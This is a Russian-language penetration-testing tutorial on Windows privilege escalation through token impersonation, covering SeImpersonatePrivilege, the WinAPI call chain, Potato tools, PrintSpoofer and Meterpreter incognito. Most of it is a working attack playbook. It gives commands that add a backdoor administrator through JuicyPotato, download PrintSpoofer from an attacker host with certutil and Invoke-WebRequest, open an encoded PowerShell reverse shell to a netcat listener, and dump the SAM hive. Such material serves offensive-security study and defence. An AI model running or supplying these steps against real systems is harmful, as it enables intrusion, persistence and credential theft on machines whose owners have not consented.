# Token Impersonation: Повышение привилегий в Windows

## Контекст и фундаментальные концепции: токены, привилегии и роль олицетворения

**Access Token (маркер доступа)** — объект ядра Windows, который описывает контекст безопасности процесса или потока, включая идентификатор пользователя, членство в группах, список привилегий и мандатный уровень целостности. Каждый процесс, создаваемый от имени пользователя, наследует копию токена родителя; потоки могут изменять собственный контекст через механизм **impersonation** (олицетворения), временно принимая токен другого клиента. Изначально этот механизм реализован для серверных приложений: веб-сервер impersonates’ит пользователя, чтобы обращаться к файлам с его уровнем доступа, а служба печати — чтобы прочитать документ, отправленный на печать. Однако злоумышленник, сумевший разместить процесс в среде с разрешением `SeImpersonatePrivilege`, может заставить высокопривилегированный системный контекст обратиться к нему, захватить токен этого контекста и запустить код с правами `NT AUTHORITY\SYSTEM`.

Windows различает два типа токенов, принципиально важных для атак повышения привилегий:

- **Primary Token (первичный токен)** — назначается процессу при его создании (функция `CreateProcessAsUser` или аналогичная). Содержит полную информацию о сеансе и может использоваться для запуска дочерних процессов с этим же контекстом. Поток, олицетворяющий клиента, продолжает существовать в рамках первичного токена процесса, но при необходимости исполняет код с олицетворённым токеном через вызов API.
- **Impersonation Token (токен олицетворения)** — создаётся, когда сервер принимает запрос от клиента и вызывает `ImpersonateLoggedOnUser`, `SetThreadToken` или `RpcImpersonateClient`. Такой токен привязан к потоку и не может использоваться для создания новых процессов напрямую, но допускает дублирование (DuplicateToken) с последующим вызовом `CreateProcessWithTokenW` или `CreateProcessAsUser`, если у вызывающего имеются соответствующие привилегии (`SeAssignPrimaryTokenPrivilege` или `SeImpersonatePrivilege` в связке с правами на дублирование токена).

В пентесте часто возникает путаница между собственно наличием `SeImpersonatePrivilege` и возможностью его эксплуатации. Необходимо чётко разделять следующие сценарии:

| Условие                                         | Чего ожидать                                                   | Типичный пример                                                                          |
|------------------------------------------------|----------------------------------------------------------------|------------------------------------------------------------------------------------------|
| Учётная запись входит в группу «Администраторы» и имеет отключённую SeImpersonatePrivilege | Токен SYSTEM можно получить стандартными средствами (например, `getsystem` в Meterpreter) без эксплуатации олицетворения | Администратор, использующий `PsExec -s -i cmd.exe`                                       |
| Процесс запущен от имени сервиса с SeImpersonatePrivilege **включённой** (Enabled), но учётная запись не администратор | Эксплуатация возможна через Potato-атаки, Named Pipe Impersonation или RPC-принуждение | IIS Application Pool (APPPOOL\DefaultAppPool), SQL Server, Service Accounts              |
| Пользователь с SeImpersonatePrivilege в интерактивном сеансе (не сервис) | Эксплуатация ограничена: невозможно принудить SYSTEM-процесс подключиться к локальному сокету | Обычный доменный пользователь, которому администратор вручную выдал привилегию            |
| Присутствие SeAssignPrimaryTokenPrivilege или SeTcbPrivilege | Даёт немедленное право запускать процессы с чужим токеном – ещё более опасная комбинация | Служебные учётные записи, права на которые получены через уязвимость                      |

Legitimate-сценарий олицетворения в Windows выглядит так: клиент подключается к именованному каналу (Named Pipe), сервер вызывает `ImpersonateNamedPipeClient`, выполняет проверку прав доступа к ресурсу, затем вызывает `RevertToSelf`. Атакующий ломает эту логику, принуждая SYSTEM-контекст подключиться к своему управляемому каналу и **не отпуская** захваченный токен.

```text
[Атакующий процесс]                                [Сервис SYSTEM]
       |                                                 |
       | (1) создаёт Named Pipe (\\.\pipe\juicypotato)    |
       |                                                 |
       | (2) заставляет сервис через COM/DCOM/RPC         |
       | обратиться к pipe                                |
       |<====== NTLM-аутентификация (SYSTEM) =============|
       |                                                 |
       | (3) вызывает ImpersonateNamedPipeClient         |
       |     получает Impersonation Token (SYSTEM)       |
       |                                                 |
       | (4) дублирует токен (DuplicateTokenEx)          |
       |     и запускает cmd.exe с SYSTEM-токеном        |
       |                                                 |
       |=====> новый процесс (SYSTEM) создан             |
```

Таким образом, Token Impersonation — это не уязвимость и не баг, а техника злоупотребления легитимным механизмом, требующая определённых предусловий. Она классифицируется MITRE ATT&CK как подтехника **T1134.001 (Access Token Manipulation: Token Impersonation/Theft)** и входит в тактику Privilege Escalation. Понимание разницы между токенами и условий их захвата — первый шаг к успешной эксплуатации.

## Внутреннее устройство атаки: привилегии, API и варианты принуждения

Техника Token Impersonation представляет собой атаку класса **Privilege Escalation via Impersonation**, которая воспроизводится всякий раз, когда процесс с `SeImpersonatePrivilege` способен захватить токен более привилегированного пользователя, дублировать его и создать с его помощью новый процесс. Для этого атакующий должен решить три задачи:

1. Захватить токен высокопривилегированного контекста (обычно `NT AUTHORITY\SYSTEM`).
2. Преобразовать его в первичный токен (или использовать как олицетворённый для запуска процесса).
3. Выполнить полезную нагрузку в новом процессе.

### Привилегии, необходимые для эксплуатации

Windows имеет десятки привилегий, но лишь часть из них позволяет проводить токен-имперсонацию. Таблица, обобщающая данные исследований [Priv2Admin](https://github.com/gtworek/Priv2Admin):

| Привилегия                     | Назначение                                                             | Метод эксплуатации (инструмент)                                          |
|--------------------------------|-------------------------------------------------------------------------|---------------------------------------------------------------------------|
| **SeImpersonatePrivilege**     | Олицетворять клиента после аутентификации                              | JuicyPotato, RoguePotato, PrintSpoofer, SweetPotato, Meterpreter`s getsystem (incognito) |
| **SeAssignPrimaryTokenPrivilege** | Заменять токен процесса первичным токеном                           | Аналогично SeImpersonate, часто применяется в паре с ней                   |
| **SeTcbPrivilege**             | Действовать как часть доверенной вычислительной базы (TCB)             | Любой вызов CreateProcessAsUser; позволяет обойти проверки ACL               |
| **SeDebugPrivilege**           | Открывать и изменять процессы других пользователей                     | Дуплицирование токена через OpenProcess + OpenProcessToken + DuplicateToken (PowerShell, Tokenvator) |
| **SeCreateTokenPrivilege**     | Создавать произвольный primary token                                   | Редко, но даёт полный контроль; обычно требует режима ядра                   |
| **SeBackupPrivilege**          | Чтение любых файлов (обход ACL)                                        | Не токен-имперсонация, но тоже ведёт к админским правам                    |

Наличие `SeImpersonatePrivilege` в состоянии **Enabled** для процесса — необходимое, но не достаточное условие. Дополнительно требуются:

- Возможность принудить SYSTEM-процесс аутентифицироваться на контролируемый атакующим канал (Named Pipe, TCP-сокет).
- Отсутствие ограничений целостности (Integrity Level): олицетворённый токен может иметь более высокий IL, и попытка его дублирования с LOW или MEDIUM уровня заблокируется (если не понизить через `SetTokenInformation`).
- Учётная запись атакующего должна принадлежать тому же сеансу (Session), что и целевой процесс, в большинстве Potato-атак (исключение — RoguePotato, использующий RPC для кросс-сессионной аутентификации).

### Цепочка WinAPI: от захвата до создания процесса

Технический каркас атаки всегда опирается на фиксированный набор вызовов:

```text
[Шаг 1] Ожидание входящего подключения
  CreateNamedPipe(\\.\pipe\атакующий_канал, ...)
  ConnectNamedPipe(...)

[Шаг 2] Получение олицетворённого токена после аутентификации клиента
  ImpersonateNamedPipeClient(hPipe)   // или RpcImpersonateClient, если через RPC

[Шаг 3] Открытие токена потока
  OpenThreadToken(GetCurrentThread(), TOKEN_DUPLICATE | TOKEN_QUERY, TRUE, &hToken)

[Шаг 4] Дублирование токена с уровнем SecurityImpersonation (или SecurityDelegation)
  DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &hDupToken)

[Шаг 5] Запуск процесса с полученным первичным токеном
  CreateProcessWithTokenW(hDupToken, 0, NULL, L"cmd.exe", ...)
  // или CreateProcessAsUser, если известна сессия

// Альтернативный вариант без дублирования — ImpersonateLoggedOnUser + CreateProcessAsUserW
```

Эта последовательность реализована почти во всех публичных инструментах. Разница между «Potato»-семействами заключается лишь в способе заставить SYSTEM-контекст инициировать подключение.

### Основные методы принуждения SYSTEM к аутентификации

- **BITS / Port 6666 (RottenPotato)** — служба Background Intelligent Transfer Service принимает запросы на порту 6666; атакующий поднимает MitM-точку, перенаправляя аутентификацию на свой канал. Служба часто отключена или порт занят, поэтому надёжность низкая.
- **COM/DCOM + OXID-резолвер (JuicyPotato, GenericPotato)** — атакующий регистрирует локальный COM-сервер с известным CLSID, который SYSTEM-процесс вызывает при обработке определённых запросов (например, `BITS`, `WSearch`). В результате SYSTEM подключается к pipe атакующего через NTLM-аутентификацию. Требует подбора CLSID под версию ОС.
- **Принтерная служба Spooler (PrintSpoofer / PipePotato)** — злоумышленник создаёт именованный канал с именем `\\.\pipe\spoolss`, запускает принтерную операцию (например, `XcvData`), и Spooler служба, работающая от SYSTEM, сама аутентифицируется на этом канале. Работает на большинстве современных сборок Windows 10/11 и Server 2016–2025 с включённой службой.
- **RPC-интерфейс WinRM или Task Scheduler (RoguePotato)** — используется удалённый вызов процедур для перенаправления аутентификации с SYSTEM-контекста на TCP-сокет атакующего, не привязываясь к сеансу; позволяет срабатывать даже при блокировках сессий.

Независимо от метода, после успешной аутентификации на управляемом канале атакующий получает Impersonation Token с уровнем SYSTEM, который затем используется для порождения нового процесса.

## Применение на практике: инструментарий и типовые сценарии эксплуатации

В реальной пентест-операции проверка возможности Token Impersonation начинается с аудита привилегий текущего пользователя:

```powershell
whoami /priv
```

Вывод, характерный для сервисного аккаунта с включённой SeImpersonatePrivilege:

```text
PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token            Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeChangeNotifyPrivilege       Bypass traverse checking                 Enabled
SeCreateGlobalPrivilege       Create global objects                    Enabled
```

Если `SeImpersonatePrivilege` включена, дальнейшие действия зависят от контекста:

### Инструменты уровня ОС

**1. JuicyPotato / RoguePotato / SweetPotato**  
Наиболее универсальное решение: один исполняемый файл принимает на вход порт (или CLSID) и команду. Типичный вызов:

```cmd
JuicyPotato.exe -l 1337 -p C:\Windows\System32\cmd.exe -a "/c net user pentest Password123 /add && net localgroup Administrators pentest /add" -t *
```

Где:
- `-l 1337` — порт, на котором будет слушать COM-сервер.
- `-p` — путь к исполняемому файлу.
- `-a` — аргументы запуска.
- `-t *` — использовать любые доступные CLSID (можно указать конкретный для конкретной ОС).

Вывод успешного выполнения:

```
Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
......
[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM
[+] CreateProcessWithTokenW OK
```

Проверка созданного пользователя:

```cmd
net user pentest
```

Вывод подтвердит членство в Administrators.

**2. PrintSpoofer**  
Более стабильный метод на Windows 10/11. Эксплуатирует Named Pipe спулера. Запуск:

```cmd
PrintSpoofer.exe -i -c cmd.exe
```

где `-i` — интерактивный режим (передать управление консолью). При успехе открывается новое окно командной строки от SYSTEM. Аналитическая команда для проверки сессии:

```cmd
whoami
```

Ожидаемый вывод: `nt authority\system`.

### Сценарии в Meterpreter и C2-фреймворках

В Metasploit модуль `incognito` позволяет манипулировать токенами без ручной загрузки Potato. После получения Meterpreter-сессии на сервисном аккаунте:

```bash
meterpreter> getprivs
```
Вывод должен содержать `SeImpersonatePrivilege`. Далее:

```bash
meterpreter> getsystem
```
Техника `getsystem` автоматически пробует несколько методов, включая Named Pipe Impersonation (через создание службы или pipe). Альтернативно можно использовать ручной подход:

```bash
meterpreter> use incognito
meterpreter> list_tokens -u
meterpreter> impersonate_token "NT AUTHORITY\\SYSTEM"
meterpreter> execute -f cmd.exe -i
```

### Проверка возможности эксплуатации через скрипты

Для автоматизации аудита применяют PowerShell-скрипты, проверяющие `SeImpersonatePrivilege` и доступные каналы:

```powershell
Get-WmiObject Win32_Service | Where-Object { $_.StartName -match 'LocalSystem' }
```

Или проверка состояния привилегии:

```powershell
$(whoami /priv | Select-String "SeImpersonatePrivilege")
```

В контексте AD-тестирования инструмент **Netexec** (бывший CrackMapExec) может удалённо проверить возможность имперсонации через модуль `impersonate`, загружая легковесный Impersonate.exe:

```bash
nxc smb 10.0.1.10 -u backdoor -p 'Password.123' --local-auth -M impersonate -o TOKEN=7 EXEC=whoami
```

Вывод отразит успешное выполнение команды от имени целевого пользователя (по ID токена).

**Типичные ошибки и ограничения:**

- Запуск Potato в сеансе без интерактивного входа (session 0 isolation) может требовать указания флага `-i` и передачи дескриптора сеанса.
- Антивирус часто детектирует известные Potato-сигнатуры; в таких случаях применяют кастомные сборки или PowerShell-имплементации, например `Invoke-RottenPotato` из модуля PSReflect.
- Некорректный CLSID приводит к отсутствию аутентификации; требуется перебор либо использование динамического резолвера.
- Если целевой токен имеет более высокий Integrity Level (High/System), а атакующий процесс — Medium, дупликация токена в Primary запрещена. PrintSpoofer обходит это через вызов `CreateProcessAsUserW` непосредственно с олицетворённым токеном без дупликации.

## Сквозной практический пример: повышение привилегий через SeImpersonatePrivilege на IIS сервере

**Исходные условия:** У нас есть low-privilege shell на Windows Server 2022, полученный через уязвимость веб-приложения. Текущий пользователь — `iis apppool\defaultapppool`, привилегии процесса включают `SeImpersonatePrivilege Enabled`. Задача — получить SYSTEM.

### Шаг 1: Аудит привилегий

Проверяем текущие права командой:

```cmd
whoami /priv
```

Вывод:

```
PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State
============================= ========================================= ========
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeChangeNotifyPrivilege       Bypass traverse checking                 Enabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
```

Делаем вывод, что эксплуатация возможна.

### Шаг 2: Загрузка PrintSpoofer на целевую систему

Скачиваем с контроллера или используем certutil для хитрой доставки:

```cmd
certutil -urlcache -split -f http://10.10.14.15:8000/PrintSpoofer.exe C:\Windows\Tasks\ps.exe
```

Альтернативно можно использовать PowerShell:

```powershell
Invoke-WebRequest -Uri "http://10.10.14.15:8000/PrintSpoofer.exe" -OutFile "C:\Users\Public\ps.exe"
```

### Шаг 3: Эксплуатация через PrintSpoofer

Запускаем эксплойт с командой на создание обратного PowerShell-коннекта:

```cmd
C:\Windows\Tasks\ps.exe -i -c "powershell -e <base64_encoded_reverse_shell>"
```

После выполнения на атакующей машине поднимается слушатель (например, `nc -lvp 4444`), и через несколько секунд приходит соединение:

```text
connect to [10.10.14.15] from (UNKNOWN) [10.10.10.50] 49674
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Windows\system32> whoami
nt authority\system
```

### Шаг 4: Подтверждение привилегий

В полученной сессии выполняем:

```cmd
whoami /groups | findstr /i "mandatory"
```

Вывод:

```
Mandatory Label\System Mandatory Level
```

Или проверяем возможность чтения базы SAM:

```cmd
reg save hklm\sam C:\Users\Public\sam.bak
```

Успешное выполнение команды reg save подтверждает уровень SYSTEM.

### Ожидаемый вывод примера

Пример демонстрирует полный жизненный цикл техники Token Impersonation: от обнаружения включённой привилегии до запуска кода в контексте SYSTEM с помощью PrintSpoofer, эксплуатирующего механизм Named Pipe Impersonation через службу спулера. Полученный результат — полноценный доступ уровня SYSTEM без необходимости знать пароль встроенной учётной записи.

## Источники

- [Token Impersonation and SeImpersonatePrivilege Abuse – My Penetration Test Guide](https://reaper.gitbook.io/my-penetration-test-guide/privilege-escalation/windows-privilege-escalation/token-impersonation-and-seimpersonateprivilege-abuse)
- [Windows Privilege Escalation – Token Impersonation – Steflan's Security Blog](https://steflan-security.com/linux-privilege-escalation-token-impersonation)
- [Detecting Access Token Manipulation Attacks – HTB Academy](https://academy.hackthebox.com/course/preview/detecting-access-token-manipulation-attacks)
- [Access Token Manipulation, Technique T1134 – MITRE ATT&CK](https://attack.mitre.org/techniques/T1134)
- [A Process is No One: Hunting for Token Manipulation – Black Hat EU 2017, Jared Atkinson, Robby Winchester](https://blackhat.com/docs/eu-17/materials/eu-17-Atkinson-A-Process-Is-No-One-Hunting-For-Token-Manipulation.pdf)
- [Domain Escalation with Token Impersonation – Nairuz Abulhul, R3d Buck3T](https://medium.com/r3d-buck3t/domain-escalation-with-token-impersonation-bc577db55a0f)
- [Windows – Privilege Escalation – Internal All The Things](https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/windows-privilege-escalation)
- [Priv2Admin – Privilege to Admin mapping](https://github.com/gtworek/Priv2Admin)
- [Privilege Escalation via Named Pipe Impersonation – Elastic Security](https://www.elastic.co/guide/en/security/8.19/privilege-escalation-via-named-pipe-impersonation.html)
- [Security Implications of Windows Access Tokens – MWR InfoSecurity](https://www.exploit-db.com/docs/english/13054-security-implications-of-windows-access-tokens.pdf)